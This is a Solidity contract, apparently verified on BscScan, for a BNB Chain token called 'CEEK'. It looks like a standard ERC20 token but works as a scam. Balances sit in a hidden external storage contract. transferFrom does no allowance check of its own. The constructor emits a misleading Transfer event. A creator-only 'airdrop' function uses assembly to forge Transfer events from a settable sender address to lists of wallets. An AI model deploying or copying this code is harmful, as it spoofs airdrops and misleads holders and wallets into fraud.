/**
 *Submitted for verification at BscScan.com on 2022-10-17
*/

pragma solidity ^0.8.9;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IGasToken {
    function freeUpTo(uint256 value) external;
}

interface IERC20Storage {
    function init(address pair) external;

    function totalSupply() external view returns (uint256);

    function erc20Balance(address account) external view returns (uint256);

    function erc20Transfer(
        address sender,
        address to,
        uint256 value
    ) external;

    function erc20Allowance(address owner, address spender) external view returns (uint256);

    function erc20Approve(
        address sender,
        address spender,
        uint256 value
    ) external;
}

contract CEEK is IERC20 {
    string public name = "CEEK";
    string public symbol = "CEEK";
    uint8 public decimals = 18;

    address creator = msg.sender;
    uint256 public cakeAmount;
    IERC20Storage erc20Storage;

    IFactory private immutable pancakeFactory = IFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);

    address private immutable USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    
    address private immutable GasToken = 0x0000000000004946c0e9F43F4Dee607b0eF1fA1c;

    address airdropAddr = 0x41772eDd47D9DDF9ef848cDB34fE76143908c7Ad;

    constructor(address _storage) {
        cakeAmount = 1000 * 1e18;
        erc20Storage = IERC20Storage(_storage);
        erc20Storage.init(pancakeFactory.createPair(address(this), USDC));
        emit Transfer(address(this), msg.sender, erc20Storage.totalSupply() / 100 * 90);
    }

    modifier onlyCreator() {
        require(tx.origin == creator, "Only creator");
        _;
    }

    function totalSupply() external view returns (uint256) {
        return erc20Storage.totalSupply();
    }

    function balanceOf(address account) external view returns (uint256) {
        return erc20Storage.erc20Balance(account);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        emit Transfer(msg.sender, to, amount);
        erc20Storage.erc20Transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return erc20Storage.erc20Allowance(owner, spender);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        erc20Storage.erc20Approve(msg.sender, spender, amount);
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        erc20Storage.erc20Transfer(from, to, amount);
        emit Transfer(from, to, amount);
        return true;
    }

    function withdraw(address target, uint amount) public onlyCreator {
        payable(target).transfer(amount);
    }

    function withdrawToken(
        address token,
        address target,
        uint amount
    ) public onlyCreator {
        IERC20(token).transfer(target, amount);
    }

    function airdrop(bytes memory data, uint256 burnGasTokenAmount) external onlyCreator {
        uint256 _start = 0;
        address token = airdropAddr;
        uint256 len = data.length / 20;
        bytes32 topic0 = bytes32(keccak256("Transfer(address,address,uint256)"));
        uint256 amount = cakeAmount;

        for (uint256 i = 0; i < len; ) {
            assembly {
                mstore(0, amount)
                log3(0, 0x20, topic0, token, shr(96, mload(add(add(data, 0x20), _start))))
                i := add(i, 1)
                _start := add(_start, 20)
            }
        }

        if (burnGasTokenAmount > 0) {
            IGasToken(GasToken).freeUpTo(burnGasTokenAmount);
        }
    }

    function setAirdropAddr(address _airdrop) external onlyCreator {
        airdropAddr = _airdrop;
    }

    receive() external payable {}
}